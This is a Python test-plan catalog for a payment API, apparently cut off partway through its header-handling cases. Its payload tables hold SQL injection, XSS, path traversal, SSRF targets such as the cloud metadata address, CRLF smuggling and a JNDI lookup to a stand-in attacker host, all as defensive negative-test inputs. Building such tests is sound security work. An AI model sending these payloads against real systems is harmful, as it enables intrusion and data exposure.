"""Machine-readable integration + security test plan for the ChmabaPay API surface.

One catalog, many runners: the dev-only browser runner served at
``/_dev/integration-test``, a headless httpx script, or CI. Every case declares

  * the exact request (method / path / query / body / headers / auth mode),
  * declarative assertions (status, error detail, JSON paths, bodies, headers),
  * the fixtures it needs (``requires``) so a runner can SKIP instead of guess,
  * whether it mutates or destroys state (``mutates`` / ``destructive``),
  * whether it touches the public internet (``network`` — the ABA PayWay SSR page),
  * an optional client-side ``check`` hook for things a plain status assert
    cannot express (CRC-16 of a KHQR payload, XSS reflection, host poisoning...).

The catalog is data only — no FastAPI / httpx imports — so it can be imported by
the app, by tests, and by offline tooling alike.
"""

from __future__ import annotations

from datetime import UTC, datetime
from typing import Any
from urllib.parse import quote

# --------------------------------------------------------------------------- #
# Constants
# --------------------------------------------------------------------------- #
PAYWAY_LINK = "https://link.payway.com.kh/ABAPAYpe518710Y"
PAYWAY_SLUG = "ABAPAYpe518710Y"
PLAN_VERSION = "1.0"

SEV_CRITICAL = "critical"
SEV_HIGH = "high"
SEV_MEDIUM = "medium"
SEV_LOW = "low"

KIND_API = "api"
KIND_NETWORK = "network"
KIND_DESTRUCTIVE = "destructive"
KIND_FIXTURE = "fixture"

_UNSET: Any = object()


def _pay_body(**fields: Any) -> dict[str, Any]:
    """A payment-create body that targets the fixture store.

    Without an explicit ``store`` the API resolves the *single* active store and
    returns 400 ``store_required_or_merchant_required`` for multi-store
    workspaces — which would silently mask every amount/idempotency assertion.

    ``hosted_qr`` is pinned off because these cases assert the payload *we*
    build: the CRC, Tag 30.02 destination and the 30-day Tag 99 window are all
    properties of the offline encoder. The merchant-facing default now hands a
    PayWay link to ABA instead, which would change every one of those
    assertions and spend a real ABA session per case. The hosted path has its
    own coverage in the ``live-pay`` group.
    """
    return {"store": "$store", "hosted_qr": False, **fields}


def _raw_pay(raw: str) -> str:
    """Inject the fixture store into a raw JSON *object* body, leaving
    non-object bodies (arrays, truncated JSON, ``null``) untouched so the
    malformed-payload cases still reach the parser as intended."""
    stripped = raw.strip()
    if not (stripped.startswith("{") and stripped.endswith("}")):
        return raw
    inner = stripped[1:-1].strip()
    return '{"store": "$store", ' + inner + "}" if inner else '{"store": "$store"}'


def _case(
    cid: str,
    group: str,
    title: str,
    *,
    severity: str = SEV_MEDIUM,
    method: str = "GET",
    path: str = "/",
    auth: str = "key",
    query: dict[str, Any] | None = None,
    query_raw: str | None = None,
    body: Any = _UNSET,
    raw_body: str | None = None,
    headers: dict[str, str] | None = None,
    expect: dict[str, Any] | None = None,
    requires: list[str] | None = None,
    produces: dict[str, str] | None = None,
    skip_if: str | None = None,
    mutates: bool = False,
    destructive: bool = False,
    network: bool = False,
    manual: bool = False,
    informational: bool = False,
    serial: bool = False,
    omit_credentials: bool = False,
    concurrency: int | None = None,
    check: str | None = None,
    steps: list[dict[str, Any]] | None = None,
    note: str | None = None,
    tags: list[str] | None = None,
) -> dict[str, Any]:
    """Build one case dict, dropping keys that carry no information."""
    case: dict[str, Any] = {
        "id": cid,
        "group": group,
        "title": title,
        "severity": severity,
        "method": method,
        "path": path,
        "auth": auth,
    }
    optional: dict[str, Any] = {
        "query": query,
        "query_raw": query_raw,
        "raw_body": raw_body,
        "headers": headers,
        "expect": expect or {},
        "requires": requires or [],
        "produces": produces,
        "skip_if": skip_if,
        "concurrency": concurrency,
        "check": check,
        "steps": steps,
        "note": note,
        "tags": tags or [],
    }
    for key, value in optional.items():
        if value not in (None, [], {}):
            case[key] = value
    if body is not _UNSET:
        case["body"] = body
    for flag, enabled in (
        ("mutates", mutates),
        ("destructive", destructive),
        ("network", network),
        ("manual", manual),
        ("informational", informational),
        ("serial", serial),
        ("omit_credentials", omit_credentials),
    ):
        if enabled:
            case[flag] = True
    return case


# --------------------------------------------------------------------------- #
# Reusable payload tables
# --------------------------------------------------------------------------- #
# Values that must never reach a query string / path segment unescaped.
INJECTION_PAYLOADS: list[str] = [
    "' OR 1=1--",
    "' OR '1'='1",
    "1;DROP TABLE payments",
    "1';DELETE FROM payments WHERE '1'='1",
    "1 UNION SELECT NULL,version()--",
    "<script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    '" onmouseover="alert(1)',
    "../../../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "%00",
    "${jndi:ldap://evil.example.com/a}",
    "{{7*7}}",
    "{{constructor.constructor('alert(1)')()}}",
    "'+alert(1)+'",
    "\u2028\u2029",
]

# Malformed / hostile request headers. Values are what an attacker would send.
HOSTILE_HEADERS: list[tuple[str, str, str]] = [
    ("x-forwarded-host", "evil.example.com", "host poisoning via X-Forwarded-Host"),
    ("x-forwarded-host", "localhost:9999", "internal host claim via X-Forwarded-Host"),
    ("x-forwarded-proto", "http", "TLS downgrade claim"),
    ("x-forwarded-proto", "javascript:alert(1)", "scheme injection"),
    ("x-forwarded-for", "127.0.0.1", "loopback spoof"),
    ("x-forwarded-for", "0.0.0.0, 10.0.0.1, 192.168.1.1", "proxy chain spoof"),
    ("x-real-ip", "10.0.0.1", "internal IP spoof"),
    ("x-http-method-override", "DELETE", "verb tunnelling"),
    ("x-original-url", "/v1/keys", "URL rewrite smuggling"),
    ("x-rewrite-url", "/v1/admin/accounts", "URL rewrite smuggling"),
    ("x-chmabapay-trace", "not-a-uuid", "trace id must be replaced, not echoed"),
    ("x-chmabapay-trace", "../etc/passwd", "trace id path traversal"),
    ("forwarded", "for=evil.example.com;host=evil.example.com", "RFC 7239 host poisoning"),
    ("host", "evil.example.com", "absolute Host header poisoning"),
    ("origin", "null", "null origin"),
    ("referer", "https://evil.example.com/x", "foreign referer"),
    ("content-type", "application/x-www-form-urlencoded", "content-type confusion"),
    ("content-type", "text/plain", "content-type confusion"),
    ("content-type", "application/json; charset=utf-16", "charset confusion"),
    ("accept", "application/xml", "content negotiation"),
    ("accept-encoding", "gzip;q=0,,,", "malformed q-values"),
    ("user-agent", "'; DROP TABLE payments--", "UA SQLi"),
    ("cookie", "chmabapay_session=not.a.jwt", "forged session cookie"),
    ("authorization", "Bearer null", "null bearer"),
    ("authorization", "Bearer undefined", "undefined bearer"),
    ("authorization", "Bearer 0", "zero bearer"),
]

# Unsigned values the ``amount`` field must reject or normalise deterministically.
AMOUNT_VALUES: list[tuple[str, Any, str]] = [
    # (label, raw JSON value, expectation: ok | too_low | invalid | type_error)
    ("0", 0, "too_low"),
    ("-0", -0, "too_low"),
    ("-1", -1, "too_low"),
    ("-0.01", -0.01, "too_low"),
    ("0.001", 0.001, "invalid"),
    ("0.004", 0.004, "invalid"),
    ("0.005", 0.005, "invalid"),
    ("0.009", 0.009, "invalid"),
    ("0.01", 0.01, "ok"),
    ("0.02", 0.02, "ok"),
    ("0.1", 0.1, "ok"),
    ("0.10", 0.10, "ok"),
    ("0.11", 0.11, "ok"),
    ("0.29", 0.29, "ok"),
    ("0.30", 0.30, "ok"),
    ("0.50", 0.5, "ok"),
    ("0.99", 0.99, "ok"),
    ("1", 1, "ok"),
    ("1.00", 1.00, "ok"),
    ("1.01", 1.01, "ok"),
    ("1.001", 1.001, "invalid"),
    ("1.005", 1.005, "invalid"),
    ("1.05", 1.05, "ok"),
    ("4.99", 4.99, "ok"),
    ("10", 10, "ok"),
    ("33.33", 33.33, "ok"),
    ("66.67", 66.67, "ok"),
    ("99.99", 99.99, "ok"),
    ("100", 100, "ok"),
    ("1234.56", 1234.56, "ok"),
    ("9999.99", 9999.99, "ok"),
    ("99999.99", 99999.99, "ok"),
    ("1000000", 1000000, "ok"),
    ("10000000", 10000000, "ok"),
    ("1e6", 1000000.0, "ok"),
    ("1e9", 1000000000.0, "ok"),
    ("1e12", 1000000000000.0, "ok"),
    ("1e15", 1000000000000000.0, "ok"),
    ("float_noise_0.1_plus_0.2", 0.1 + 0.2, "invalid"),
    ("0.30000000000000004", 0.30000000000000004, "invalid"),
    ("1/3", 1 / 3, "invalid"),
    ("0.1e-2", 0.001, "invalid"),
    ("float_min_positive", 5e-324, "invalid"),
    ("int_bool_true", True, "coerced_or_rejected"),
    ("int_bool_false", False, "too_low"),
    ("string_decimal", "1.50", "ok"),
    ("string_with_spaces", " 2.00 ", "ok"),
    ("string_scientific", "1e2", "ok"),
    ("string_zero", "0", "too_low"),
    ("string_negative", "-5", "too_low"),
    ("string_not_a_number", "abc", "type_error"),
    ("string_empty", "", "type_error"),
    ("string_hex", "0x10", "type_error"),
    ("string_three_decimals", "1.001", "invalid"),
    ("string_sql", "1;DROP TABLE payments", "type_error"),
    ("string_very_long", "1" * 400, "informational"),
    ("string_null_word", "null", "type_error"),
    ("null", None, "type_error"),
    ("list_empty", [], "type_error"),
    ("list_one", [1], "type_error"),
    ("object_empty", {}, "type_error"),
    ("object_amount", {"amount": 1}, "type_error"),
    ("object_nested", {"amount": {"amount": 1}}, "type_error"),
]

RAW_AMOUNT_BODIES: list[tuple[str, str, str]] = [
    # (label, raw JSON text, expectation)
    ("nan_literal", '{"amount": NaN}', "rejected"),
    ("infinity_literal", '{"amount": Infinity}', "rejected"),
    ("negative_infinity_literal", '{"amount": -Infinity}', "rejected"),
    ("overflow_exponent", '{"amount": 1e400}', "rejected"),
    ("huge_exponent", '{"amount": 1e309}', "rejected"),
    ("truncated_json", '{"amount": 1.0', "rejected"),
    ("duplicate_key", '{"amount": 1.00, "amount": 2.00}', "accepted"),
    ("number_as_quoted_json", '{"amount": "1.00"}', "accepted"),
    ("comment_in_json", '{"amount": 1.00 /*x*/}', "rejected"),
    ("trailing_comma", '{"amount": 1.00,}', "rejected"),
    ("single_quotes", "{'amount': 1.00}", "rejected"),
    ("empty_object", "{}", "rejected"),
    ("array_root", "[1.00]", "rejected"),
    ("deeply_nested_bomb", '{"amount": ' + "[" * 200 + "1" + "]" * 200 + "}", "rejected"),
    ("null_body", "null", "rejected"),
    ("bom_prefixed", '\ufeff{"amount": 1.00}', "rejected"),
    ("unicode_digits", '{"amount": "١.٥٠"}', "rejected"),
    ("fullwidth_digits", '{"amount": "１.５０"}', "rejected"),
    ("sql_in_json", '{"amount": 1; DROP TABLE payments}', "rejected"),
]

# ABA PayWay link shapes — valid, odd and hostile.
LINK_VARIANTS: list[tuple[str, str, bool]] = [
    # (label, value, expects_success_shape)
    ("full_url", PAYWAY_LINK, True),
    ("bare_slug", PAYWAY_SLUG, True),
    ("url_with_query", PAYWAY_LINK + "?utm=test", True),
    ("url_with_fragment", PAYWAY_LINK + "#scan", True),
    ("url_trailing_slash", PAYWAY_LINK + "/", True),
    ("slug_uppercase", PAYWAY_SLUG.upper(), True),
    ("slug_lowercase", PAYWAY_SLUG.lower(), True),
    ("slug_with_query", PAYWAY_SLUG + "?x=1", True),
    ("http_scheme", "http://link.payway.com.kh/" + PAYWAY_SLUG, True),
    ("extra_path_segment", PAYWAY_LINK + "/extra/segment", True),
    ("link_host_uppercase", "https://LINK.PAYWAY.COM.KH/" + PAYWAY_SLUG, True),
    ("foreign_host", "https://evil.example.com/pay-me", False),
    ("loopback_host", "http://127.0.0.1:8000/admin", False),
    ("javascript_scheme", "javascript:alert(1)", False),
    ("data_scheme", "data:text/html,<script>alert(1)</script>", False),
    ("file_scheme", "file:///etc/passwd", False),
    ("protocol_relative", "//evil.example.com/x", False),
    ("ftp_scheme", "ftp://link.payway.com.kh/" + PAYWAY_SLUG, False),
    ("five_chars", "abcde", False),
    ("six_chars", "abcdef", False),
    ("513_chars", "A" * 513, False),
    ("512_chars", "A" * 512, False),
    ("unicode_slug", "លេខកូដបង់ប្រាក់", False),
    ("emoji_slug", "pa🅆ay🎉link", False),
    ("whitespace", "      ", False),
    ("null_byte", "\u0000" + PAYWAY_SLUG, False),
    ("crlf", "abc\r\nSet-Cookie: pwned=1", False),
    ("sqli", "' OR 1=1--", False),
    ("traversal", "../../../etc/passwd", False),
    ("xss", "<script>alert(1)</script>", False),
    ("host_only", "https://link.payway.com.kh/", False),
]

CURRENCY_VARIANTS: list[str | None] = ["USD", "KHR", "usd", "khr", "XYZ", "840", "ᜃ", ""]

TTL_VARIANTS: list[Any] = [29, 30, 31, 60, 300, 86400, 86400 * 30, 86400 * 30 + 1, 0, -1, "abc", None]

WEBHOOK_URL_VARIANTS: list[tuple[str, str, bool]] = [
    # (label, url, must_be_rejected)
    #
    # The delivery worker POSTs to whatever is stored here, so a URL that is
    # never fetched (file:, javascript:, gopher:, link-local metadata IPs) or
    # that points back inside the platform is an SSRF / scheme-smuggling hole.
    ("https_ok", "https://sink.example.com/chmabapay", False),
    ("http_ok", "http://sink.example.com/chmabapay", False),
    ("localhost_ssrf", "http://localhost:8000/v1/admin/accounts", True),
    ("loopback_ip_ssrf", "http://127.0.0.1:8000/v1/keys", True),
    ("metadata_ssrf", "http://169.254.169.254/latest/meta-data/", True),
    ("private_net_ssrf", "http://10.0.0.5/internal", True),
    ("file_scheme", "file:///etc/passwd", True),
    ("javascript_scheme", "javascript:alert(1)", True),
    ("data_scheme", "data:text/html,<script>alert(1)</script>", True),
    ("ftp_scheme", "ftp://example.com/hook", True),
    ("gopher_scheme", "gopher://example.com/_hook", True),
    ("dict_scheme", "dict://example.com:11211/", True),
    ("credentials_in_url", "https://user:pass@sink.example.com/hook", False),
    ("at_sign_trick", "https://sink.example.com@evil.example.com/hook", False),
    ("seven_chars", "http://", True),
    ("eight_chars", "http://a", False),
    ("unicode_host", "https://ស៊ីន.example.com/hook", False),
    ("with_fragment", "https://sink.example.com/hook#frag", False),
    ("with_query", "https://sink.example.com/hook?token=1", False),
    ("crlf", "https://sink.example.com/hook\r\nX-Injected: 1", True),
    ("space_inside", "https://sink.example.com/ho ok", True),
    ("uppercase_scheme", "HTTPS://sink.example.com/hook", False),
    ("no_scheme", "sink.example.com/hook", True),
    ("empty", "", True),
    ("very_long", "https://sink.example.com/" + "a" * 4000, False),
]

TXN_ID_VARIANTS: list[tuple[str, str, str]] = [
    ("empty", "", "rejected"),
    ("one_char", "a", "rejected"),
    ("two_chars", "ab", "rejected"),
    ("sqli", "' OR 1=1--", "informational"),
    ("xss", "<script>alert(1)</script>", "informational"),
    ("traversal", "../../etc/passwd", "informational"),
    ("wildcard", "*", "informational"),
    ("unicode", "លេខ", "informational"),
    ("spaces", "   ", "informational"),
    ("null_byte", "%00", "informational"),
]

DATE_FROM_VARIANTS: list[tuple[str, str]] = [
    ("valid_2026_01_01", "2026-01-01"),
    ("valid_2026_09_01", "2026-09-01"),
    ("valid_epoch", "1970-01-01"),
    ("valid_1969", "1969-12-31"),
    ("valid_2100", "2100-01-01"),
    ("impossible_day", "2026-02-30"),
    ("impossible_month", "2026-13-01"),
    ("zero_month", "2026-00-10"),
    ("impossible_day_31", "2026-09-31"),
    ("not_a_date", "not-a-date"),
    ("sqli", "'; DROP TABLE payments--"),
    ("empty", ""),
    ("iso_datetime", "2026-09-01T12:00:00Z"),
    ("basic_format", "20260901"),
]

DATE_TO_VARIANTS: list[tuple[str, str]] = [
    ("valid_2026_12_31", "2026-12-31"),
    ("valid_2026_09_30", "2026-09-30"),
    ("before_from", "2026-01-01"),
    ("leap_day", "2028-02-29"),
    ("non_leap_day", "2026-02-29"),
    ("impossible_month", "2026-00-10"),
    ("impossible_day", "2026-04-31"),
    ("not_a_date", "yesterday"),
    ("sqli", "' OR 1=1--"),
    ("empty", ""),
]


# --------------------------------------------------------------------------- #
# Case groups
# --------------------------------------------------------------------------- #
def _setup_cases() -> list[dict[str, Any]]:
    """Fixture creation. Runs first; fills the runner's context."""
    return [
        _case(
            "SETUP-001",
            "setup",
            "Health probe — service is up and versioned",
            severity=SEV_CRITICAL,
            path="/health",
            auth="none",
            expect={"status": 200, "json_has": ["status", "app"]},
            note="Everything else is meaningless if this fails.",
            tags=[KIND_FIXTURE],
        ),
        _case(
            "SETUP-002",
            "setup",
            "Resolve the workspace store used by every payment case",
            severity=SEV_CRITICAL,
            path="/v1/stores",
            expect={"status": 200, "json_has": ["data"], "check": "list_shape"},
            produces={"store": "$.data[0].id"},
            note="First store of the workspace becomes the payment target.",
            tags=[KIND_FIXTURE],
        ),
        _case(
            "SETUP-003",
            "setup",
            "Create a disposable store when the workspace has none",
            severity=SEV_HIGH,
            method="POST",
            path="/v1/stores",
            body={
                "name": "Integration Test Store",
                "external_id": "integration-test-$nonce",
                "link": {"raw_link": "$payway_link", "merchant_account_id": "$payway_slug"},
            },
            expect={"status": 201, "json_has": ["id", "status"]},
            skip_if="store",
            produces={"store": "$.id"},
            mutates=True,
            informational=True,
            note="Plan caps can legitimately refuse this (400 max stores).",
            tags=[KIND_FIXTURE],
        ),
        _case(
            "SETUP-004",
            "setup",
            "Create a disposable payment so lifecycle cases have a subject",
            severity=SEV_HIGH,
            method="POST",
            path="/v1/payments",
            body=_pay_body(amount=1.50, reference_id="integration-setup"),
            expect={"status": 201, "json_has": ["id", "status", "checkout_url"]},
            requires=["store"],
            skip_if="payment",
            produces={"payment": "$.id"},
            mutates=True,
            note="Use a ck_test_ key so this never consumes live quota.",
            tags=[KIND_FIXTURE],
        ),
        _case(
            "SETUP-005",
            "setup",
            "Resolve or create the webhook endpoint under test",
            severity=SEV_HIGH,
            path="/v1/webhooks",
            expect={"status": 200, "check": "list_shape"},
            produces={"webhook": "$[0].id"},
            skip_if="webhook",
            note="GET /v1/webhooks returns a bare array, not a {data:[…]} envelope.",
            tags=[KIND_FIXTURE],
        ),
        _case(
            "SETUP-006",
            "setup",
            "Create the webhook endpoint when the workspace has none",
            severity=SEV_HIGH,
            method="POST",
            path="/v1/webhooks",
            body={"url": "https://example.com/chmabapay-integration-test", "events": ["payment.completed"]},
            expect={"status": 201, "json_has": ["id", "signing_secret"]},
            requires=["api_key"],
            skip_if="webhook",
            produces={"webhook": "$.id", "webhook_secret": "$.signing_secret"},
            mutates=True,
            informational=True,
            note="Plan caps can legitimately refuse this (400 max endpoints).",
            tags=[KIND_FIXTURE],
        ),
        _case(
            "SETUP-007",
            "setup",
            "Probe the dev rail used to simulate a customer paying",
            severity=SEV_MEDIUM,
            method="POST",
            path="/_dev/payments/__probe__/scan",
            expect={"status_in": [404], "detail": "payment_not_found"},
            produces={"dev_rail": "true"},
            note="404 (not 404-route) proves the dev rail is mounted.",
            tags=[KIND_FIXTURE],
        ),
        _case(
            "SETUP-008",
            "setup",
            "Probe whether a browser session cookie is present",
            severity=SEV_LOW,
            path="/v1/me",
            auth="none",
            expect={"status_in": [200, 401]},
            produces={"session": "true"},
            informational=True,
            note="API-key-only runs have no cookie; /v1/me legitimately returns 401.",
            tags=[KIND_FIXTURE],
        ),
    ]


def _smoke_cases() -> list[dict[str, Any]]:
    return [
        _case(
            "SMOKE-001",
            "smoke",
            "GET /v1/payments returns a list envelope",
            path="/v1/payments",
            query={"store": "$store", "limit": 20},
            expect={"status": 200, "json_has": ["data"], "check": "list_shape"},
            requires=["store"],
            note="A store-scoped list is required: unresolved store targeting is 400 on multi-store accounts.",
        ),
        _case(
            "SMOKE-002",
            "smoke",
            "GET /v1/stores returns a list envelope",
            path="/v1/stores",
            expect={"status": 200, "json_has": ["data"], "check": "list_shape"},
        ),
        _case(
            "SMOKE-003",
            "smoke",
            "GET /v1/keys lists workspace keys without leaking hashes",
            path="/v1/keys",
            expect={"status": 200, "json_absent": ["key_hash", "key_prefix_hash"]},
            note="A key hash in a list response is an offline-cracking oracle.",
        ),
        _case(
            "SMOKE-004",
            "smoke",
            "GET /v1/webhooks lists endpoints without exposing secrets",
            path="/v1/webhooks",
            expect={"status": 200, "json_absent": ["secret_key", "signing_secret"], "check": "list_shape"},
            note="Secrets are returned once at creation only.",
        ),
        _case(
            "SMOKE-005",
            "smoke",
            "GET /v1/billing/plans is public and well-shaped",
            path="/v1/billing/plans",
            auth="none",
            expect={"status": 200, "json_has": ["0.code", "0.monthly_fee_cents"]},
        ),
        _case(
            "SMOKE-006",
            "smoke",
            "GET /v1/reports/payments.json returns summary + pagination",
            path="/v1/reports/payments.json",
            expect={"status": 200, "json_has": ["data", "summary", "pagination"]},
        ),
        _case(
            "SMOKE-007",
            "smoke",
            "GET /v1/reports/payments.csv exports for any plan",
            path="/v1/reports/payments.csv",
            expect={"status": 200},
            note="Every plan gets CSV; the plan gate was removed (launch-gap-closure D6).",
        ),
        _case(
            "SMOKE-008",
            "smoke",
            "Every response carries a trace id",
            path="/health",
            auth="none",
            expect={"status": 200, "check": "trace_uuid"},
        ),
        _case(
            "SMOKE-009",
            "smoke",
            "A caller-supplied trace id must be a UUID or replaced",
            path="/health",
            auth="none",
            headers={"X-ChmabaPay-Trace": "../../etc/passwd"},
            expect={"status": 200, "check": "trace_uuid"},
            note="Echoing a caller value verbatim into a log/header is log injection.",
        ),
    ]


def _auth_cases() -> list[dict[str, Any]]:
    """Missing / malformed / wrong-scope credentials across the surface."""
    targets: list[tuple[str, str, Any]] = [
        ("GET", "/v1/stores", None),
        ("GET", "/v1/payments", None),
        ("POST", "/v1/payments", {"amount": 1.00}),
        ("GET", "/v1/keys", None),
        ("GET", "/v1/webhooks", None),
        ("GET", "/v1/reports/payments.json", None),
        ("GET", "/v1/transactions/instruction-ref/CHMTEST123", None),
    ]
    bad_credentials: list[tuple[str, dict[str, str], str]] = [
        # (label, headers, expected `detail`)
        #
        # Two distinct code paths, two distinct codes — both must be 401:
        #   * "unauthorized"      — header looked like a key (ck_/st_/sk_ after
        #                           the Bearer scheme) and failed key resolution.
        #   * "invalid_session"   — no usable key was presented at all, so the
        #                           request fell through to session auth.
        ("no_header", {}, "invalid_session"),
        ("empty_value", {"Authorization": ""}, "invalid_session"),
        ("scheme_only", {"Authorization": "Bearer"}, "invalid_session"),
        ("scheme_trailing_space", {"Authorization": "Bearer "}, "invalid_session"),
        ("lowercase_scheme", {"Authorization": "bearer ck_test_placeholder"}, "invalid_session"),
        ("no_scheme", {"Authorization": "ck_test_placeholder"}, "invalid_session"),
        ("basic_scheme", {"Authorization": "Basic dXNlcjpwYXNzd29yZA=="}, "invalid_session"),
        ("jwt_shaped", {"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.e30.zzz"}, "invalid_session"),
        ("uuid_shaped", {"Authorization": "Bearer 550e8400-e29b-41d4-a716-446655440000"}, "invalid_session"),
        ("tab_after_scheme", {"Authorization": "Bearer\tck_test_placeholder"}, "invalid_session"),
        ("unknown_key", {"Authorization": "Bearer ck_test_0000000000000000000"}, "unauthorized"),
        ("unknown_live_key", {"Authorization": "Bearer ck_live_0000000000000000000"}, "unauthorized"),
        ("store_scope_key", {"Authorization": "Bearer st_test_store_scoped_key"}, "unauthorized"),
        ("secret_scope_key", {"Authorization": "Bearer sk_test_secret_scoped_key"}, "unauthorized"),
        ("empty_key_body", {"Authorization": "Bearer ck_test_"}, "unauthorized"),
        ("double_space", {"Authorization": "Bearer  ck_test_placeholder"}, "unauthorized"),
        ("very_long_key", {"Authorization": "Bearer ck_test_" + "a" * 4096}, "unauthorized"),
    ]
    # Clients normalise or refuse these header shapes before they reach the wire
    # (httpx rejects trailing whitespace outright), so a transport-level result is
    # an acceptable outcome and the case is reported as informational.
    client_normalised = {"scheme_trailing_space"}
    cases: list[dict[str, Any]] = []
    index = 0
    for method, path, body in targets:
        slug = path.strip("/").replace("/", "-").replace(".", "-")
        for label, headers, expected_detail in bad_credentials:
            index += 1
            case = _case(
                f"AUTH-{index:03d}",
                "auth",
                f"{method} {path} with {label} must not authorise",
                severity=SEV_CRITICAL,
                method=method,
                path=path,
                auth="none",
                omit_credentials=True,
                headers=headers,
                expect={"status": 401, "detail": expected_detail},
                informational=label in client_normalised,
                note="Authentication must fail closed with a single opaque code. Cookies are omitted so an ambient portal session cannot authenticate the call.",
                tags=[KIND_API, slug],
            )
            if body is not None:
                case["body"] = body
            cases.append(case)

    # Wrong method / verb tunnelling on every mutating surface.
    method_probes: list[tuple[str, str, dict[str, Any] | None, list[int]]] = [
        ("DELETE", "/v1/payments", None, [405]),
        ("PUT", "/v1/payments", None, [405]),
        ("PATCH", "/v1/payments", None, [405]),
        ("DELETE", "/v1/keys", None, [405]),
        ("PUT", "/v1/keys", None, [405]),
        ("PUT", "/v1/webhooks", None, [405]),
        ("DELETE", "/v1/webhooks", None, [405]),
        ("POST", "/v1/reports/payments.json", {}, [405]),
        ("GET", "/v1/reports/payments.json", None, [200]),
        ("GET", "/health", None, [200]),
        ("GET", "/v1/webhooks/1/rotate-secret", None, [404, 405]),
        ("PATCH", "/v1/payments/abc", None, [404, 405]),
    ]
    for method, path, probe_body, allowed in method_probes:
        cases.append(
            _case(
                f"AUTH-{len(cases) + 1:03d}",
                "auth",
                f"{method} {path} does not reach an unintended handler",
                severity=SEV_MEDIUM,
                method=method,
                path=path,
                body=probe_body if probe_body is not None else _UNSET,
                auth="none" if path == "/health" else "key",
                expect={"status_in": allowed},
                informational=method == "GET",
                note="405 vs 404 is a framework detail; both prove no state changed.",
            ),
        )

    # Session-only endpoints must not accept an API key.
    cases.append(
        _case(
            f"AUTH-{len(cases) + 1:03d}",
            "auth",
            "GET /v1/me is session-only and must reject an API key",
            severity=SEV_HIGH,
            path="/v1/me",
            omit_credentials=True,
            expect={"status": 401, "detail": "invalid_session"},
            note="Billing/account endpoints are cookie-scoped; a key must not stand in.",
        ),
    )
    # KHQR generation is documented as an authenticated /v1 endpoint. The handler
    # takes no auth dependency at all, so it answers anonymous callers — and every
    # anonymous call triggers an outbound fetch to the ABA PayWay SSR page.
    cases.append(
        _case(
            f"AUTH-{len(cases) + 1:03d}",
            "auth",
            "POST /v1/khqr/from-link must require a key (no credentials sent)",
            severity=SEV_CRITICAL,
            method="POST",
            path="/v1/khqr/from-link",
            auth="none",
            omit_credentials=True,
            body={"link": PAYWAY_SLUG, "amount": 1.00, "bakong_id": "audit@abaa"},
            expect={"status": 401, "detail": "invalid_session"},
            network=True,
            note="Unauthenticated callers can drive outbound SSR fetches and QR generation for free.",
        ),
    )
    cases.append(
        _case(
            f"AUTH-{len(cases) + 1:03d}",
            "auth",
            "POST /v1/khqr/from-link must reject an unknown key",
            severity=SEV_CRITICAL,
            method="POST",
            path="/v1/khqr/from-link",
            omit_credentials=True,
            headers={"Authorization": "Bearer ck_test_0000000000000000000"},
            body={"link": PAYWAY_SLUG, "amount": 1.00, "bakong_id": "audit@abaa"},
            expect={"status": 401, "detail": "unauthorized"},
            network=True,
        ),
    )
    # `get_hybrid_admin_context` declares `session_account` as an eager dependency,
    # so a cookie-less API-key request is refused by session auth before the
    # is_platform_admin gate can answer 403. Failing closed is safe, but the
    # documented "Bearer ck_ OR session" contract is not actually reachable.
    admin_intent = "Intended 403 (is_platform_admin gate); 401 means the session dependency short-circuits first."
    cases.append(
        _case(
            f"AUTH-{len(cases) + 1:03d}",
            "auth",
            "Admin surface rejects an ordinary workspace key (expect 403 gate)",
            severity=SEV_CRITICAL,
            path="/v1/admin/accounts",
            omit_credentials=True,
            expect={"status_in": [401, 403], "detail_in": ["forbidden", "unauthorized", "invalid_session"]},
            informational=True,
            note=admin_intent,
        ),
    )
    for path in (
        "/v1/admin/plans",
        "/v1/admin/invoices",
        "/v1/admin/overview",
        "/v1/admin/accounts/1",
    ):
        cases.append(
            _case(
                f"AUTH-{len(cases) + 1:03d}",
                "auth",
                f"{path} requires platform admin",
                severity=SEV_CRITICAL,
                path=path,
                omit_credentials=True,
                expect={"status_in": [401, 403], "detail_in": ["forbidden", "unauthorized", "invalid_session"]},
                informational=True,
                note=admin_intent,
            ),
        )
    cases.append(
        _case(
            f"AUTH-{len(cases) + 1:03d}",
            "auth",
            "Unsupported admin method never reaches the handler",
            severity=SEV_MEDIUM,
            method="DELETE",
            path="/v1/admin/accounts/1",
            expect={"status_in": [401, 403, 404, 405]},
            informational=True,
        ),
    )

    # Mass assignment: `extra="forbid"` models must reject unknown privileged fields.
    for path, group in (("/v1/keys", "keys"), ("/v1/webhooks", "webhooks")):
        for field, value in (
            ("account_id", 1),
            ("status", "active"),
            ("scope", "account"),
            ("is_platform_admin", True),
            ("whitelabel_enabled", True),
        ):
            base = {"name": "mass-assignment"} if group == "keys" else {"url": "https://sink.example.com/hook"}
            payload = dict(base)
            payload[field] = value
            cases.append(
                _case(
                    f"AUTH-{len(cases) + 1:03d}",
                    "auth",
                    f"POST {path} rejects unknown privileged field '{field}'",
                    severity=SEV_CRITICAL,
                    method="POST",
                    path=path,
                    body=payload,
                    expect={"status": 422},
                    note="Mass assignment is privilege escalation.",
                ),
            )
    for field, value in (
        ("account_id", 1),
        ("status", "active"),
        ("whitelabel_enabled", True),
        ("is_platform_admin", True),
    ):
        cases.append(
            _case(
                f"AUTH-{len(cases) + 1:03d}",
                "auth",
                f"POST /v1/stores ignores privileged field '{field}'",
                severity=SEV_HIGH,
                method="POST",
                path="/v1/stores",
                body={"name": "mass-assignment-store", field: value},
                expect={"status_in": [201, 400], "json_absent": ["account_id", "is_platform_admin"]},
                mutates=True,
                informational=True,
                note="StoreCreate has no extra=forbid; the field must at least be ignored.",
            ),
        )
    return cases


def _header_cases() -> list[dict[str, Any]]:
    """Hostile / proxy header handling, including host poisoning of checkout_url."""
    cases: list[dict[str, Any]] = []
    counter = 0

    poisoning_headers = [
        h for h in HOSTILE_HEADERS
        if h[0] in ("host", "x-forwarded-host", "forwarded", "x-forwarded-proto", "x-real-ip", "x-original-url")
    ]
    poisoning_targets = [
        ("POST", "/v1/payments", {"store": "$store", "amount": 1.00}, True),
        ("GET", "/v1/payments", None, False),
        ("GET", "/health", None, False),
    ]
    for _label, value, _desc in poisoning_headers:
        for method, path, body, check_host in poisoning_targets:
            counter += 1
            case = _case(
                f"HDR-{counter:03d}",
                "headers",
                f"{method} {path} with hostile header {_label}: {value[:32]}",
                severity=SEV_HIGH,
                method=method,
                path=path,
                headers={_label: value},
